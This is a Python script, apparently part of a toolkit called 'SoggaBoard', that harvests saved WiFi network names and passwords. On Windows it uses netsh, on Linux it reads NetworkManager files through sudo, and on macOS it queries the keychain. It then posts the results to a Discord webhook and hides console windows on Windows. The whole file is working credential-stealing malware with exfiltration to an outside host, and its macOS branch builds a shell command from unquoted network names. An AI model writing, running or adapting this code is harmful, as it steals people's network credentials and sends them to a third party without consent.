import subprocess
import os
import sys
import re
import requests
from datetime import datetime
WEBHOOK_URL = "replace_with_webhook"

def send_to_webhook(content):
    """Sends extracted data to Discord with professional formatting and chunking."""
    if "LINK" in WEBHOOK_URL or not WEBHOOK_URL.startswith("http"):
        return
    chunks = [content[i:i + 1900] for i in range(0, len(content), 1900)]
    
    hostname = os.getenv('COMPUTERNAME') or (os.uname().nodename if hasattr(os, 'uname') else 'Unknown-Host')

    for i, chunk in enumerate(chunks):
        embed = {
            "title": f"🔑 WIFI REPORT // {hostname} [{'PART ' + str(i+1) if len(chunks) > 1 else 'COMPLETE'}]",
            "description": f"Extracted at `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`",
            "color": 15105570,
            "fields": [
                {"name": "Credentials (SSID | PASS)", "value": f"```\n{chunk}\n```"}
            ],
            "footer": {"text": "SoggaBoard v2.7 | Universal Harvester"}
        }
        try:
            requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
        except:
            pass

def harvest_windows():
    """Extracts passwords using netsh wlan."""
    data_log = ""
    try:
        profiles_raw = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], startupinfo=get_si()).decode('cp1252', errors='ignore').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in profiles_raw if "All User Profile" in i] 
        for name in profiles:
            try:
                res = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], startupinfo=get_si()).decode('cp1252', errors='ignore').split('\n')
                pass_line = [b.split(":")[1][1:-1] for b in res if "Key Content" in b]
                password = pass_line[0] if pass_line else "[OPEN/NONE]"
                data_log += f"{name:<25} | {password}\n"
            except:
                continue
    except Exception as e:
        data_log = f"Windows Error: {str(e)}"
    return data_log
def harvest_linux():
    """Extracts passwords from NetworkManager system files (Requires Sudo)."""
    data_log = ""
    path = "/etc/NetworkManager/system-connections/"
    
    if not os.path.exists(path):
        return "Linux Error: NetworkManager paths not found (Check /etc/NetworkManager/)."

    try:
        files = subprocess.check_output(['sudo', 'ls', path]).decode().split()
        for f in files:
            try:
                content = subprocess.check_output(['sudo', 'cat', os.path.join(path, f)]).decode(errors='ignore')
                ssid = re.search(r'id=(.*)', content)
                psk = re.search(r'psk=(.*)', content)
                if ssid:
                    s_name = ssid.group(1).strip()
                    p_val = psk.group(1).strip() if psk else "[OPEN/NO_PSK]"
                    data_log += f"{s_name:<25} | {p_val}\n"
            except:
                continue
    except Exception as e:
        data_log = f"Linux Error: {str(e)} (Ensure script runs with sudo)"
    return data_log

def harvest_macos():
    """Extracts currently connected or stored passwords via security keychain."""
    data_log = ""
    try:
        cmd = "security find-generic-password -D \"AirPort network password\" -a"
        current_ssid = subprocess.check_output(["/usr/sbin/networksetup", "-getpreferredwirelessnetworks", "en0"]).decode().split('\n')[1:]
        
        for ssid in current_ssid:
            ssid = ssid.strip()
            if not ssid: continue
            try:
                raw_out = subprocess.check_output(f"security find-generic-password -wa {ssid}", shell=True, stderr=subprocess.STDOUT).decode().strip()
                data_log += f"{ssid:<25} | {raw_out}\n"
            except:
                data_log += f"{ssid:<25} | [KEYCHAIN_LOCKED]\n"
    except Exception as e:
        data_log = f"macOS Error: {str(e)}"
    return data_log

def get_si():
    """Prevents console windows from popping up on Windows."""
    if sys.platform == "win32":
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        return si
    return None

def run():
    print(f"\n\033[94m[*] SOGGABOARD WIFI HARVESTER // DETECTING OS...\033[0m")
    
    extracted_data = ""
    
    if sys.platform == "win32":
        print("[>] Platform: Windows")
        extracted_data = harvest_windows()
    elif sys.platform == "darwin":
        print("[>] Platform: macOS")
        extracted_data = harvest_macos()
    elif sys.platform.startswith("linux"):
        print("[>] Platform: Linux (Major Distros)")
        extracted_data = harvest_linux()
    else:
        print("\033[91m[-] Error: Operating System not supported.\033[0m")
        return

    if extracted_data.strip():
        print("\n\033[92m[+] EXTRACTION COMPLETE\033[0m")
        print("-" * 40)
        print(extracted_data)
        print("-" * 40)
        send_to_webhook(extracted_data)
        print("\033[92m[+] Data dispatched to Discord Webhook.\033[0m")
    else:
        print("\033[93m[!] No saved WiFi profiles found.\033[0m")

    input("\n[!] Press Enter to return to toolkit...")
